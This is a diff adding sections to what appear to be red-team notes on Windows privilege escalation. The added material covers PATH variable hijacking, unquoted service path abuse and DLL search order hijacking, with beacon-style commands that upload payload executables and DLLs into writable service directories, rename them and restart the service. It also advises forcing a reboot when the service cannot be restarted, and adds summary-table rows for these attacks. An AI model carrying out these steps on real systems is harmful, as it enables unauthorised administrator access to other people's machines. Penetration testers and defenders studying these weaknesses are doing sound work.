@@ -17,6 +17,24 @@ cacls C:\Path\To\Check\
 
 ---
 
+## PATH Variable Hijacking
+
+The `%PATH%` variable is constructed from two locations:
+
+- **User** - `HKEY_CURRENT_USER\Environment` (user can modify)
+- **Machine** - `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment` (admin only)
+
+User processes use Machine + User paths. System processes use only Machine paths.
+
+```
+env
+cacls C:\Python313\Scripts\
+```
+
+If a directory in PATH is writable by standard users, you can place a malicious executable there.
+
+---
+
 ## Service Exploits
 
 ### Search Order Hijacking
@@ -39,6 +57,9 @@ mv dns_x64.exe cmd.exe
 Exploit unquoted paths with spaces.
 
 ```
+# Enumerate services
+sc_enum
+
 # Check permissions on parent directory
 cacls "C:\Program Files\Bad Windows Service"
 # Output: NT AUTHORITY\Authenticated Users:(CI)(OI)F
@@ -47,7 +68,11 @@ cacls "C:\Program Files\Bad Windows Service"
 cd "C:\Program Files\Bad Windows Service"
 upload C:\Payloads\dns_x64.svc.exe
 mv dns_x64.svc.exe Service.exe
+sc_stop BadWindowsService
+sc_start BadWindowsService
 ```
+
+> If you cannot start/stop the service, wait for reboot or trigger one.
 
 ### Weak Service Binary Permissions
 
@@ -87,6 +112,28 @@ sc_start BadWindowsService
 
 # Restore original binpath after exploitation
 sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2
+```
+
+---
+
+## DLL Search Order Hijacking
+
+Typical DLL search order:
+1. The executing directory
+2. The System32 directory
+3. The 16-bit System directory
+4. The Windows directory
+5. The current working directory
+6. Directories in PATH
+
+```
+# Check if service directory is writable
+cacls "C:\Program Files\Bad Windows Service\Service Executable"
+# Output: NT AUTHORITY\Authenticated Users:(CI)(OI)F
+
+cd "C:\Program Files\Bad Windows Service\Service Executable"
+upload C:\Payloads\dns_x64.dll
+mv dns_x64.dll BadDll.dll
 ```
 
 ---
@@ -154,8 +201,10 @@ runasadmin [exploit] [command] [args]
 
 | Vulnerability | Detection | Exploitation |
 |---------------|-----------|--------------|
+| PATH Hijack | Writable dir in PATH | Place malicious EXE |
 | Search Order Hijack | Writable service directory | Place malicious DLL/EXE |
 | Unquoted Path | Space in unquoted service path | Place EXE at path break |
 | Weak Binary | Writable service executable | Replace EXE |
 | Weak Registry | Writable service registry key | Modify ImagePath |
+| DLL Hijack | Writable dir in DLL search order | Place malicious DLL |
 | UAC Bypass | Medium integrity + local admin | elevate/runasadmin |
